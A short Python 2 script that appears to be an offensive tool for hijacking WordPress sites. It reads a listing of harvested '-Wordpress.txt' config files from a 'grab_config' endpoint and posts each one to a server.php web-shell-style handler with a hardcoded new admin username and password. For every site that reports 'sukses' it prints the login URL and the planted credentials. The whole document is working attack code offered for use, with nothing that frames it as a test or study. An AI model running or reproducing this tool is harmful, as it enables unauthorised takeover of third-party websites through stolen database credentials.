import requests, re

user = "admin403" # Change If You Want
pwd = "JancoxSc0de"
head = {"User-agent":"Linux Mozilla 5/0"}
text1 = requests.get("http://localh0st.io/grab_config", headers=head).text
list = re.findall('</td><td><a href="(.*?)">', text1)
for i in list:
	if "-Wordpress.txt" in i:
		data = {"user_baru":user,"pass_baru":pwd,"config_dir":i,"hajar":"hajar"}
		text = requests.post("http://localh0st.io/grab_config/server.php", data=data, headers=head).text
		if "color=lime>sukses" in text:
			print "\033[32;1mSukses -> \033[0m"+re.findall("Login => <a href='(.*?)' target='_blank'>", text)[0]+"|"+user+"|"+pwd
		else:
			pass
